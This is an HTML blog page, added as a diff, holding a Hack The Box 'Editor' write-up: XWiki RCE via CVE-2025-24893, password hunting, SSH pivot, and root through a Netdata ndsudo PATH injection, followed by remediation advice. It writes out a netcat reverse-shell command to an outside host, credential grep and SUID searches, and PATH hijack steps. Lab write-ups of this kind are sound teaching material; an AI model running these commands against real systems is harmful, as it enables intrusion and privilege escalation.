@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Editor CTF Writeup - 18gi0n's Tech Lair</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="icon" type="image/x-icon" href="/assets/images/racoon.ico">
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+        }
+
+        body {
+            position: relative;
+            min-height: 100vh;
+        }
+
+        .opaque-bg {
+            background-color: rgba(13, 13, 13, 0.6);
+            position: fixed;
+            top: 50px;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .content {
+            position: relative;
+            z-index: 2;
+            min-height: 100vh;
+            padding-bottom: 20px;
+        }
+
+        .content .left-aligned-content {
+            text-align: left !important;
+            max-width: 800px;
+            margin: 0 20px !important;
+            padding: 20px 0 !important;
+        }
+
+        .content .left-aligned-content h1,
+        .content .left-aligned-content h2,
+        .content .left-aligned-content p,
+        .content .left-aligned-content ul,
+        .content .left-aligned-content ol,
+        .content .left-aligned-content li {
+            text-align: left !important;
+        }
+
+        .content .left-aligned-content a {
+            color: #ff9933 !important;
+            text-decoration: underline;
+        }
+
+        .content .left-aligned-content a:hover {
+            color: #ff007a !important;
+            text-shadow: 0 0 5px #ff007a;
+        }
+
+        .content .left-aligned-content img {
+            margin: 20px 0 !important;
+            display: block;
+        }
+
+        @media (max-width: 600px) {
+            .content .left-aligned-content {
+                margin: 0 10px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Nav Bar -->
+    <nav>
+        <ul>
+            <li><a href="/index.html">Home</a></li>
+            <li><a href="/about.html">About</a></li>
+            <li><a href="/projects.html">Projects</a></li>
+            <li><a href="/code.html">Code & Tools</a></li>
+            <li><a href="/ctf.html">Write-ups</a></li>
+            <li><a href="/research.html">Research</a></li>
+        </ul>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="opaque-bg" id="opaqueBg"></div>
+    <div class="content">
+        <div class="left-aligned-content">
+            <h1>Editor CTF Writeup - Hack The Box</h1>
+            <img src="/assets/images/ctf/editor/title.png" alt="Editor Cover">
+            <h2>1. Box Overview</h2>
+            <p>
+                Editor from Hack The Box was an engaging challenge that tested my skills in network enumeration, web exploration, vulnerability research, remote code execution, credential discovery, and privilege escalation. The box involved exploiting a vulnerable XWiki instance for initial access via RCE, discovering credentials to pivot to a user account via SSH, and escalating to root by leveraging a PATH injection vulnerability in Netdata. It was a great mix of real-world pentesting techniques, emphasizing the importance of OSINT, careful exploit usage, and thorough enumeration.
+            </p>
+            <ul>
+                <li><strong>Objective:</strong> Gain initial access, escalate to root, and capture the user and root flags.</li>
+                <li><strong>Skills Developed:</strong> Nmap scanning, hosts file modification, web application enumeration, OSINT for vulnerabilities, RCE exploitation, reverse shells, shell upgrades, user enumeration, credential searching, SSH access, and privilege escalation via PATH injection.</li>
+                <li><strong>Platform:</strong> Hack The Box</li>
+            </ul>
+
+            <h2>2. Resources Used</h2>
+            <p>Here are the resources that guided me through this challenge:</p>
+            <ul>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://github.com/gunzf0x/CVE-2025-24893">GitHub PoC for CVE-2025-24893</a><br>
+                    Usage: Provided a proof-of-concept exploit for the XWiki RCE vulnerability.
+                </li>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://github.com/AzureADTrent/CVE-2024-32019-POC">GitHub PoC for CVE-2024-32019</a><br>
+                    Usage: Offered a proof-of-concept for the Netdata PATH injection privilege escalation.
+                </li>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24893">NVD - CVE-2025-24893</a><br>
+                    Usage: Detailed information on the XWiki vulnerability.
+                </li>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93">Netdata Security Advisory GHSA-pmhq-4cxq-wj93</a><br>
+                    Usage: Official advisory for the Netdata vulnerability.
+                </li>
+            </ul>
+
+            <h2>3. My Approach to Pwning Editor</h2>
+            <p>Here’s a step-by-step breakdown of how I tackled the Editor box, from initial reconnaissance to capturing both flags.</p>
+
+            <h3>Starting with Nmap Recon</h3>
+            <p>
+                I began with an Nmap scan to identify open ports and services. This revealed open ports, including likely port 80 or 8080 for the web server.
+            </p>
+            <img src="/assets/images/ctf/editor/1.png" alt="Nmap scan results">
+
+            <h3>Adding Domain to /etc/hosts</h3>
+            <p>
+                To resolve the domain to the target's IP in the web browser, I added an entry to /etc/hosts.
+            </p>
+            <img src="/assets/images/ctf/editor/2.png" alt="hosts">
+
+            <h3>Exploring the Web Server</h3>
+            <p>
+                Navigating to the web server, I found a page hosting a code editor for download.
+            </p>
+            <img src="/assets/images/ctf/editor/3.png" alt="Web server page">
+
+            <h3>Discovering XWiki Documentation</h3>
+            <p>
+                Further exploration revealed that the docs page was hosted on XWiki. At the bottom of the page, the version was displayed: 15.10.8.
+            </p>
+            <img src="/assets/images/ctf/editor/4.png" alt="XWiki version">
+            <img src="/assets/images/ctf/editor/5.png" alt="XWiki version">
+
+            <h3>OSINT on XWiki Version</h3>
+            <p>
+                Performing OSINT on XWiki 15.10.8, I discovered it was vulnerable to remote code execution via CVE-2025-24893. This vulnerability allows any guest user to execute arbitrary code remotely through the SolrSearch endpoint, potentially leading to full server compromise.
+            </p>
+            <img src="/assets/images/ctf/editor/6.png" alt="OSINT">
+            <img src="/assets/images/ctf/editor/7.png" alt="OSINT">
+            <h3>Finding and Examining PoC for CVE-2025-24893</h3>
+            <p>
+                I searched for a proof-of-concept and found one at <a href="https://github.com/gunzf0x/CVE-2025-24893">https://github.com/gunzf0x/CVE-2025-24893</a>. I copied the PoC into a .py file on my system using vim and examined the code before execution (always inspect code from external sources).
+            </p>
+            <img src="/assets/images/ctf/editor/8.png" alt="user PoC">
+
+            <h3>Setting Up a Listener and Executing the Exploit</h3>
+            <p>
+                I set up a listener to catch the reverse shell. Then, I executed the PoC with the target URL and a reverse shell command: <code>python3 CVE-2025-24893.py -t 'http://10.10.11.80:8080' -c 'busybox nc 10.10.14.177 7777 -e /bin/bash'</code>.
+            </p>
+            <img src="/assets/images/ctf/editor/9.png" alt="nc">
+            <img src="/assets/images/ctf/editor/10.png" alt="user PoC">
+
+            <h3>Upgrading the Shell</h3>
+            <p>
+                Once the reverse shell connected, I upgraded it for better interactivity.
+            </p>
+            <img src="/assets/images/ctf/editor/11.png" alt="upgrade shell">
+            <h3>User Enumeration</h3>
+            <p>
+                As the webapp user, I performed basic discovery to identify other users on the system and found the user 'oliver'.
+            </p>
+            <img src="/assets/images/ctf/editor/12.png" alt="enum">
+
+            <h3>Searching for Passwords</h3>
+            <p>
+                I searched for passwords in accessible files using <code>grep -iR "pass" 2>/dev/null</code>. This noisy method revealed potential passwords, and one ('theEd1t0rTeam99') worked for oliver.
+            </p>
+            <img src="/assets/images/ctf/editor/13.png" alt="user pwd">
+
+            <h3>SSH as Oliver and Capturing User Flag</h3>
+            <p>
+                Using the credentials (oliver:theEd1t0rTeam99), I SSH'd into the box and captured the user flag.
+            </p>
+            <img src="/assets/images/ctf/editor/14.png" alt="ssh">
+
+            <h3>Privilege Escalation Enumeration</h3>
+            <p>
+                I started enumerating for privilege escalation avenues. Notably, the user was in the 'netdata' group.
+            </p>
+            <img src="/assets/images/ctf/editor/15.png" alt="id">
+            <h3>Identifying SUID Binaries</h3>
+            <p>
+                Using <code>find / -user root -perm -4000 -print 2>/dev/null</code>, I found non-standard SUID binaries in the Netdata directory.
+            </p>
+            <img src="/assets/images/ctf/editor/16.png" alt="suid">
+
+            <h3>Researching Netdata Vulnerabilities</h3>
+            <p>
+                Researching Netdata revealed vulnerabilities, particularly a PATH injection issue in ndsudo (CVE-2024-32019), where it references 'nvme' without an absolute path. I found a PoC at <a href="https://github.com/AzureADTrent/CVE-2024-32019-POC">https://github.com/AzureADTrent/CVE-2024-32019-POC</a>.
+            </p>
+            <img src="/assets/images/ctf/editor/17.png" alt="root PoC">
+            <h3>Creating and Transferring the Malicious Binary</h3>
+            <p>
+                Following the PoC, I created a C binary ('nvme') that sets UID and GID to 0 and spawns /bin/bash. I transferred it to the target via SCP using oliver's credentials.
+            </p>
+            <img src="/assets/images/ctf/editor/18.png" alt="root PoC">
+            <img src="/assets/images/ctf/editor/19.png" alt="root PoC">
+            <img src="/assets/images/ctf/editor/20.png" alt="root PoC">
+            <h3>Preparing and Executing the Exploit</h3>
+            <p>
+                On the target, I made it executable: <code>chmod +x /tmp/nvme</code>, added to PATH: <code>export PATH=/tmp:$PATH</code>, and executed the ndsudo binary, which found my malicious nvme first, spawning a root shell.
+            </p>
+            <img src="/assets/images/ctf/editor/21.png" alt="exec root PoC">
+            <img src="/assets/images/ctf/editor/22.png" alt="exec root PoC">
+            <img src="/assets/images/ctf/editor/23.png" alt="exec root PoC">
+
+            <h2>4. Remediation of Vulnerabilities</h2>
+            <p>Here’s how to remediate the key vulnerabilities exploited in this challenge:</p>
+            <ul>
+                <li><strong>CVE-2025-24893 (XWiki RCE):</strong> Update XWiki to a patched version, such as 15.10.11, 16.4.1, or 16.5.0 or later. Additionally, enforce authentication for sensitive endpoints like SolrSearch, restrict guest access, and monitor for anomalous activity on the server.</li>
+                <li><strong>CVE-2024-32019 (Netdata PATH Injection):</strong> Update Netdata to the latest version that addresses the security advisory GHSA-pmhq-4cxq-wj93, which fixes the untrusted search path in ndsudo by using absolute paths. Restrict membership to the netdata group to trusted users only, ensure secure PATH environments, and consider removing SUID bits from binaries if not required.</li>
+            </ul>
+
+            <h2>5. Lessons Learned and Tips</h2>
+            <p>Here’s what I took away from the Editor box:</p>
+            <ul>
+                <li><strong>Tip 1:</strong> Always perform OSINT on identified software versions to uncover known vulnerabilities—tools like NVD and search engines are invaluable.</li>
+                <li><strong>Tip 2:</strong> Examine proof-of-concept code thoroughly before executing it to avoid unintended consequences.</li>
+                <li><strong>Tip 3:</strong> Searching for passwords with grep can yield results, but be aware it generates noise; use more targeted methods when possible.</li>
+                <li><strong>Tip 4:</strong> Check user groups and SUID binaries for privilege escalation opportunities—non-standard paths often indicate exploitable configurations.</li>
+                <li><strong>Key Lesson:</strong> PATH injection vulnerabilities highlight the importance of using absolute paths in scripts and binaries, especially those with elevated permissions.</li>
+                <li><strong>Future Goals:</strong> I plan to practice more with automated enumeration tools like LinPEAS and deepen my knowledge of web application vulnerabilities in platforms like XWiki.</li>
+            </ul>
+
+            <h2>6. Conclusion</h2>
+            <img src="/assets/images/ctf/editor/root congrats.png" alt="Completed badge">
+            <p>
+                Editor was a rewarding HTB challenge that honed my skills in vulnerability exploitation, credential pivoting, and privilege escalation. From exploiting an XWiki RCE to leveraging a Netdata PATH injection for root, each step provided valuable insights. The combination of web app and Linux priv esc techniques made it particularly educational, and I'm eager to tackle more boxes like this!
+            </p>
+
+            <h2>7. Additional Notes</h2>
+            <ul>
+                <li>The <a href="https://github.com/gunzf0x/CVE-2025-24893">CVE-2025-24893 PoC</a> was crucial for initial access—always verify exploits.</li>
+                <li><a href="https://github.com/AzureADTrent/CVE-2024-32019-POC">CVE-2024-32019 PoC</a> demonstrated effective PATH injection techniques.</li>
+                <li>For more on Netdata security, refer to the <a href="https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93">official advisory</a>.</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // Dynamically set the height of opaque-bg to match the document height
+        function setOpaqueBgHeight() {
+            const opaqueBg = document.getElementById('opaqueBg');
+            const docHeight = Math.max(
+                document.body.scrollHeight,
+                document.documentElement.scrollHeight,
+                document.body.offsetHeight,
+                document.documentElement.offsetHeight,
+                document.body.clientHeight,
+                document.documentElement.clientHeight
+            );
+            opaqueBg.style.height = `${docHeight - 50}px`;
+        }
+
+        window.addEventListener('load', setOpaqueBgHeight);
+        window.addEventListener('resize', setOpaqueBgHeight);
+    </script>
+</body>
+</html>
